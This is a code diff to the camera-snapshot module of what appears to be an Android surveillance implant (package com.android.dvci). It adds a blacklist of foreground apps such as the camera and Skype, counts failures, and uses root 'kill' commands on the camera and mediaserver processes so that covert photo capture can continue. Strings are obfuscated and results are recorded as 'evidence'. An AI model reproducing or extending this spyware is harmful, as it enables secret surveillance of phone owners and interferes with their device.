@@ -17,7 +17,6 @@
 package com.android.dvci.module.camera;
 
 import android.annotation.TargetApi;
-import android.app.Activity;
 import android.graphics.ImageFormat;
 import android.graphics.Rect;
 import android.graphics.SurfaceTexture;
@@ -26,20 +25,22 @@ import android.hardware.Camera;
 import android.opengl.GLES20;
 import android.os.Build;
 import android.util.Log;
-import android.view.Surface;
 
-import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.module.ModuleCamera;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
 import com.android.dvci.util.Utils;
+import com.android.mm.M;
 
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.io.OutputStream;
+import java.util.HashSet;
 import java.util.Hashtable;
 import java.util.List;
-import java.util.concurrent.Semaphore;
+import java.util.Set;
 
 //20131106: removed unnecessary glFinish(), removed hard-coded "/sdcard"
 //20131205: added alpha to EGLConfig
@@ -67,8 +68,14 @@ import java.util.concurrent.Semaphore;
 public class CameraSnapshot {
 	private static final String TAG = "CameraSnapshot";
 	public static final int CAMERA_ANY = -1;
+	//private static final long MIN_INTERVAL_FOR_INCREMENT =   60 * (1000);
 	private Object cameraLock = new Object();
-
+	private int camera_killed = 0;
+	public static final int MAX_CAMERA_KILLS = 5;
+	private int kill_camera_request=0;
+	private boolean kill_also_mediaserver=false;
+	private long lastKill = -1;
+	public Set<String> blacklist = new HashSet<String>();
 	private static CameraSnapshot singleton = null;
 	private Hashtable<Integer, Boolean> enable = new Hashtable<Integer, Boolean>();
 	private Camera.AutoFocusCallback autofocusCallback = new Camera.AutoFocusCallback() {
@@ -100,6 +107,44 @@ public class CameraSnapshot {
 		}
 	};
 
+
+
+	public void incKillreqCamera() {
+		String lasfg = ListenerProcess.self().getLastForeground();
+		if(lasfg != null ) {
+			for (String bl : blacklist) {
+				if (lasfg.contains(bl)){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (incKillreqCamera): process=" + bl + " in blacklist , skip increments and reset");
+					}
+					kill_camera_request=0;
+					return;
+				}
+			}
+		}
+		kill_camera_request++;
+	}
+
+	public int getCamera_killed() {
+		return camera_killed;
+	}
+
+	public  void clearKillreq() {
+		kill_camera_request=0;
+	}
+	public  int getKillreq() {
+		return kill_camera_request;
+	}
+	public synchronized void addBlacklist(String black) {
+		blacklist.add(black);
+	}
+	public synchronized void delBlacklist(String black) {
+		blacklist.remove(black);
+	}
+	public synchronized boolean inInBlacklist(String process) {
+		return blacklist.contains(process);
+	}
+
 	public static CameraSnapshot self(){
 		if(singleton==null){
 			singleton = new CameraSnapshot();
@@ -109,7 +154,10 @@ public class CameraSnapshot {
 
 
 	private CameraSnapshot(){
-
+		blacklist.clear();
+		addBlacklist(M.e(".camera"));
+		addBlacklist(M.e("com.skype.raider"));
+		//addBlacklist(M.e("soundrecorder"));
 	}
 
 	// camera state
@@ -223,6 +271,69 @@ public class CameraSnapshot {
 				camera = prepareCamera(cameraId, encWidth, encHeight);
 				if (camera == null) {
 					//todo: reenable disabling getting camera in case of error if needed: this.enable.put(cameraId, false);
+					//DevicePolicyManager localDPM = (DevicePolicyManager) Status.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
+					//if (Cfg.DEBUG) {
+					//	Check.log(TAG + " (snapshot), camera has been disable for someone? " + localDPM.getCameraDisabled(null));
+					//}
+					long startedAt = System.currentTimeMillis();
+					if(getKillreq()>4) {
+						if (camera_killed <= CameraSnapshot.MAX_CAMERA_KILLS) {
+
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (snapshot), something wrong with camera? WTF kill it for nth" + camera_killed + "times");
+							}
+							String pid = Utils.pidOf(M.e("camera"));
+							String pid_ms = Utils.pidOf(M.e("mediaserver"));
+							try {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (snapshot) try to kill " + pid);
+								}
+								Execute.executeRoot("kill " + pid);
+								if(kill_also_mediaserver) {
+									if (Cfg.DEBUG) {
+										Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid);
+									}
+									Execute.executeRoot("kill " + pid_ms);
+									kill_also_mediaserver = false;
+								}
+								//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
+									camera_killed++;
+								//}
+								lastKill = startedAt;
+							} catch (Exception ex) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (snapshot) Error: " + ex);
+								}
+							}
+							clearKillreq();
+						}else{
+							EvidenceBuilder.info(M.e("camera Module suspended"));
+							String pid = Utils.pidOf(M.e("camera"));
+							String pid_ms = Utils.pidOf(M.e("mediaserver"));
+							try {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (snapshot) try to kill " + pid);
+								}
+								Execute.executeRoot("kill " + pid);
+								if (kill_also_mediaserver) {
+									if (Cfg.DEBUG) {
+										Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid);
+									}
+									Execute.executeRoot("kill " + pid_ms);
+									kill_also_mediaserver = false;
+								}
+								//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {
+								camera_killed++;
+								//}
+								lastKill = startedAt;
+							} catch (Exception ex) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (snapshot) Error: " + ex);
+								}
+							}
+
+						}
+					}
 					return;
 				}
 				if (Cfg.DEBUG) {
@@ -254,6 +365,10 @@ public class CameraSnapshot {
 			} catch (Exception e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (snapshot) ERROR: " + e);
+				}
+				incKillreqCamera();
+				if(camera!=null){
+				releaseCamera(camera);
 				}
 			}
 		}
@@ -296,6 +411,10 @@ public class CameraSnapshot {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (openCamera), Error: " + e);
 					}
+					if(e.toString().contains(M.e("Fail to connect to camera service"))){
+						kill_also_mediaserver=true;
+					}
+					incKillreqCamera();
 				}
 			}
 		}
@@ -346,6 +465,10 @@ public class CameraSnapshot {
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (prepareCamera), ERROR " + ex);
+				incKillreqCamera();
+				if(ex.toString().contains(M.e("Fail to connect to camera service"))){
+					kill_also_mediaserver=true;
+				}
 			}
 			return null;
 		}
